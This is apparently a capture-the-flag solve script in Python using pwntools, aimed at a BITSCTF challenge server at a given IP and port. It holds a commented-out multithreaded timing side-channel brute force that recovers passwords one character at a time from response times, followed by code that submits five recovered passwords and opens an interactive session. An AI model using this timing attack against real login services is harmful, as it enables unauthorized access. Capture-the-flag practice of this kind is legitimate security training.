from pwn import *
from string import printable
import threading

host = '20.244.33.146'
port = 4445
context.log_level = 'info'

# <-------------------------------------brute force brutal----------------------------------------------> #

# password1 = b'sloppytoppywithatwist'
# password2 = b'gingerdangerhermoinegranger'
# password3 = b'hickerydickerydockskibididobdobpop'
# password4 = b'snickersnortsupersecureshortshakingsafarisadistic'
# trying = b'boompopwhizzleSkizzlEraptrApMEowbarkhowLbuzzdRuMbuRPfaRtpoOP'
# last_time_taken = 0.174
# lock = threading.Lock()

# def brute_force(char):
#     global trying
#     global last_time_taken
#     while True:
#         try:
#             io = remote(host, port)
#             io.sendlineafter(b': ', password1)
#             io.sendlineafter(b': ', password2)
#             io.sendlineafter(b': ', password3)
#             io.sendlineafter(b': ', password4)
#             current_password = trying + char.encode()
#             io.sendline(current_password)
#             response = io.recvlines(2)
#             print(response)
#             time_taken_str = response[1].split(b'Time taken: ')[1].strip().decode()
#             time_taken = float(time_taken_str.split(' ')[0])
#             time_taken_rounded = round(time_taken, 3)
#             with lock:
#                 print(f'Trying {current_password}, Time taken: {time_taken_rounded:.3f}')
#                 if time_taken_rounded > last_time_taken:
#                     trying += char.encode()
#                     last_time_taken = time_taken_rounded
#                     print(f'Password found: {trying.decode()}')
#                     break
#             io.close()
#         except EOFError:
#             print(f"EOFError occurred. Response: {response}, Last tried password: {current_password}")
#             if b'BITSCTF' in response:
#                 os.system("clear")
#                 print(response)
#             return
#         except Exception as e:
#             print(f"Exception occurred: {str(e)}. Response: {response}, Last tried password: {current_password}")
#             if b'BITSCTF' in response:
#                 os.system("clear")
#                 print(response)
#             return

# threads = []
# for char in printable:
#     thread = threading.Thread(target=brute_force, args=(char,))
#     thread.start()
#     threads.append(thread)

# for thread in threads:
#     thread.join()

# <-----------------------------------end of brute force brutal-------------------------------------------> #

io = remote(host, port)
password1 = b'sloppytoppywithatwist'
password2 = b'gingerdangerhermoinegranger'
password3 = b'hickerydickerydockskibididobdobpop'
password4 = b'snickersnortsupersecureshortshakingsafarisadistic'
password5 = b'boompopwhizzleSkizzlEraptrApMEowbarkhowLbuzzdRuMbuRPfaRtpoOP'

io.sendlineafter(b': ', password1)
io.sendlineafter(b': ', password2)
io.sendlineafter(b': ', password3)
io.sendlineafter(b': ', password4)
io.sendlineafter(b': ', password5)

io.interactive()